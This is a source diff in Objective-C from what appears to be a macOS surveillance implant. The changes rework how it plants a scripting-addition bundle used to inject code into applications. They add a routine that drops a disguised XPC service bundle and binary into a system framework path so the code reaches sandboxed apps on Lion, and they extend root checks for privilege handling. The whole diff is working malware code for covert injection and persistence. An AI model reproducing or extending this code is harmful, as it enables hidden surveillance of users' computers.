@@ -226,6 +226,8 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (void)_dropOsaxBundle;
 
+- (void)_dropXPCBundle;
+
 - (void)_registerForShutdownNotifications;
 
 @end
@@ -2199,9 +2201,29 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (void)_dropOsaxBundle
 {
+  NSString *osaxRootPath = nil;
+  
+  if (getuid() == 0 || geteuid() == 0) 
+    osaxRootPath = [[NSString alloc] initWithFormat: @"%@",
+                    OSAX_ROOT_PATH];
+  else
+    osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
+                    NSUserName(),
+                    OSAX_ROOT_PATH];
+  
+  if (![[NSFileManager defaultManager] fileExistsAtPath: osaxRootPath])
+  {
+    [[NSFileManager defaultManager] createDirectoryAtPath: osaxRootPath 
+                              withIntermediateDirectories: NO 
+                                               attributes: nil 
+                                                    error: nil];
+  }
+  
   NSMutableString *osaxPath = [[NSMutableString alloc]
-                               initWithFormat: @"/Library/ScriptingAdditions/%@",
+                               initWithFormat: @"%@/%@",
+                               osaxRootPath,
                                EXT_BUNDLE_FOLDER];
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath: osaxPath])
     {
       [[NSFileManager defaultManager] removeItemAtPath: osaxPath
@@ -2210,8 +2232,7 @@ static void computerWillShutdown(CFMachPortRef port,
   
   //
   // Scripting folder
-  //
-  mkdir("/Library/ScriptingAdditions", 0755);
+  mkdir([osaxRootPath UTF8String], 0755);
   mkdir([osaxPath UTF8String], 0755);
   
   [osaxPath appendString: @"/Contents"];
@@ -2225,7 +2246,8 @@ static void computerWillShutdown(CFMachPortRef port,
   mkdir([osaxPath UTF8String], 0755);
 
   NSString *destDir = [[NSString alloc] initWithFormat:
-                       @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
+                       @"%@/%@/Contents/MacOS/%@",
+                       osaxRootPath,
                        EXT_BUNDLE_FOLDER,
                        gInputManagerName];
   [osaxPath release];
@@ -2273,8 +2295,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
   
   NSString *infoPath = [NSString stringWithFormat:
-                        @"/Library/ScriptingAdditions/%@/Contents/Info.plist",
+                        @"%@/%@/Contents/Info.plist",
+                        osaxRootPath,
                         EXT_BUNDLE_FOLDER];
+  
   [info_pl writeToFile: infoPath
             atomically: NO
               encoding: NSASCIIStringEncoding
@@ -2286,7 +2310,8 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *resource_r = [[NSString alloc] initWithCString: RCSMInputManager_r];
   
   NSString *rPath = [NSString stringWithFormat:
-                     @"/Library/ScriptingAdditions/%@/Contents/Resources/appleOsax.r",
+                     @"%@/%@/Contents/Resources/appleOsax.r",
+                     osaxRootPath,
                      EXT_BUNDLE_FOLDER];
   
   [resource_r writeToFile: rPath
@@ -2295,108 +2320,110 @@ static void computerWillShutdown(CFMachPortRef port,
                     error: NULL];
   
   [resource_r release];
+  [osaxRootPath release];
 }
 
 - (void)_dropXPCBundle
 {
-#define XPC_BUNDLE_FOLDER @""
-  
   NSMutableString *xpcPath = [[NSMutableString alloc]
-                               initWithFormat: @"/System/Library/Framework/Foundation.framework/XPCServices/%@",
-                               XPC_BUNDLE_FOLDER];
+                              initWithFormat: 
+                              @"%@/",
+                              XPC_BUNDLE_FRAMEWORK_PATH];
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
+  if (![[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
   {
-    [[NSFileManager defaultManager] removeItemAtPath: xpcPath
-                                               error: nil];
+#ifdef DEBUG_CORE
+    infoLog(@"creating folder %@ for xpc services", xpcPath);
+#endif
+     mkdir([xpcPath UTF8String], 0755);
   }
   
-  //
-  // XPC folder
-  //
+  [xpcPath appendString: XPC_BUNDLE_FOLDER_PREFIX];
+  [xpcPath appendString: gMyXPCName];
+  [xpcPath appendString: @".xpc"];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"xpc service folder %@", xpcPath);
+#endif
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
+    [[NSFileManager defaultManager] removeItemAtPath: xpcPath
+                                               error: nil];
+   
+  // .xpc folder
   mkdir([xpcPath UTF8String], 0755);
   
+  // Contents
   [xpcPath appendString: @"/Contents"];
   mkdir([xpcPath UTF8String], 0755);
   
-  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/MacOS", xpcPath];
+#ifdef DEBUG_CORE
+  infoLog(@"xpc service folder %@", xpcPath);
+#endif
+  
+  NSString *info_orig_pl = [[NSString alloc] initWithCString: xpc_info_plist];
+  
+#ifdef DEBUG_CORE
+  //infoLog(@"Original info.plist for xpc %@", info_orig_pl);
+#endif
+  
+//  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMXPCService" 
+//                                                              withString: gMyXPCName];
+  
+#ifdef DEBUG_CORE
+  //infoLog(@"info.plist for xpc %@", info_pl);
+#endif
+  
+  NSString *infoPath = [[NSString alloc] initWithFormat: @"%@/Info.plist", xpcPath];
+ 
+#ifdef DEBUG_CORE
+  infoLog(@"info.plist for xpc %@", infoPath);
+#endif
+  
+  //[info_pl
+  [info_orig_pl writeToFile: infoPath
+                 atomically: YES
+                   encoding: NSUTF8StringEncoding
+                      error: NULL];
+  
+  //[info_pl release];
+  [info_orig_pl release];
+  [infoPath release];
+  
+  // Resources
+  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/Resources", xpcPath];
   mkdir([tmpPath UTF8String], 0755);
   [tmpPath release];
   
-  [xpcPath appendString: @"/Resources"];
+  // MacOS
+  [xpcPath appendString: @"/MacOS"];
   mkdir([xpcPath UTF8String], 0755);
-  
-  NSString *destDir = [[NSString alloc] initWithFormat:
-                       @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
-                       EXT_BUNDLE_FOLDER,
-                       gInputManagerName];
-  [xpcPath release];
-  
+
 #ifdef DEBUG_CORE
-  infoLog(@"destination osax %@", destDir);
+  infoLog(@"xpc service folder %@", xpcPath);
 #endif
   
-  NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
-                         [[NSBundle mainBundle] bundlePath],
-                         gInputManagerName];
+  // Macho name
+  NSString *destXPCMacho = [[NSString alloc] initWithFormat:
+                            @"%@/%@%@",
+                            xpcPath,
+                            XPC_BUNDLE_FOLDER_PREFIX,
+                            gMyXPCName];
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
-                                           isDirectory: NO] == NO)
-  {
+  NSString *origXPCMacho = [[NSString alloc] initWithFormat: @"%@/%@",
+                            [[NSBundle mainBundle] bundlePath],
+                            gXPCName];
+ 
 #ifdef DEBUG_CORE
-    infoLog(@"copying inputmanager file from %@", tempIMDir);
+  infoLog(@"xpc service files: orig %@, dest %@", origXPCMacho, destXPCMacho);
 #endif
-    [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
-                                            toPath: destDir
-                                             error: nil];
-#ifdef DEBUG_CORE
-    if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
-                                             isDirectory: NO] == NO)
-      infoLog(@"OSAX file not created");
-    else
-      infoLog(@"OSAX file created correctly");
-#endif
-  }
+
+  [[NSFileManager defaultManager] copyItemAtPath: origXPCMacho
+                                          toPath: destXPCMacho
+                                           error: nil];
   
-  [tempIMDir release];
-  [destDir release];
-  
-  NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
-  
-#ifdef DEBUG_CORE
-  infoLog(@"Original info.plist for osax %@", info_orig_pl);
-#endif
-  
-  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
-                                                              withString: gInputManagerName];
-  
-#ifdef DEBUG_CORE
-  infoLog(@"info.plist for osax %@", info_pl);
-#endif
-  
-  NSString *infoPath = [NSString stringWithFormat:
-                        @"/Library/ScriptingAdditions/%@/Contents/Info.plist",
-                        EXT_BUNDLE_FOLDER];
-  [info_pl writeToFile: infoPath
-            atomically: NO
-              encoding: NSASCIIStringEncoding
-                 error: NULL];
-  
-  [info_pl release];
-  [info_orig_pl release];
-  
-  NSString *resource_r = [[NSString alloc] initWithCString: RCSMInputManager_r];
-  
-  NSString *rPath = [NSString stringWithFormat:
-                     @"/Library/ScriptingAdditions/%@/Contents/Resources/appleOsax.r",
-                     EXT_BUNDLE_FOLDER];
-  
-  [resource_r writeToFile: rPath
-               atomically: NO
-                 encoding: NSASCIIStringEncoding
-                    error: NULL];
-  
-  [resource_r release];
+  [origXPCMacho release];
+  [destXPCMacho release];
 }
 
 - (void)_solveKernelSymbolsForKext
@@ -3148,6 +3175,16 @@ static void computerWillShutdown(CFMachPortRef port,
               infoLog(@"Dropping OSAX");
 #endif
               [self _dropOsaxBundle];
+              
+              // Drop xpc services for sandboxed app
+              if ([gUtil isLion])
+              {
+#ifdef DEBUG_CORE
+                infoLog(@"im on lion dropping XPC service");
+#endif
+                [self _dropXPCBundle];
+              }
+                
             }
         }
     }
@@ -3510,10 +3547,11 @@ static void computerWillShutdown(CFMachPortRef port,
 - (void)injectBundle: (NSNotification*)notification
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
   NSDictionary *appInfo = [notification userInfo];
 
 #ifdef DEBUG_CORE
-  infoLog(@"running new notificaion on app %@", appInfo);
+  infoLog(@"running new notificaion on app %@ ", appInfo);
 #endif
   
   if ((gAgentCrisis & CRISIS_START) && 
@@ -3534,8 +3572,11 @@ static void computerWillShutdown(CFMachPortRef port,
     return;
   }
   
-  if (getuid() == 0)
+  if (getuid() == 0 || geteuid() == 0)
     {
+#ifdef DEBUG_CORE
+      infoLog(@"im root!");
+#endif
       if ([gUtil isLeopard])
         {
           // Only for leopard send pid to new activity monitor via shmem
@@ -3547,6 +3588,9 @@ static void computerWillShutdown(CFMachPortRef port,
         }
       else
         {
+#ifdef DEBUG_CORE
+          infoLog(@" im root: sendEventToPid");
+#endif
           // temporary thread for fixing euid/uid escalation
           [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
                                    toTarget: self 
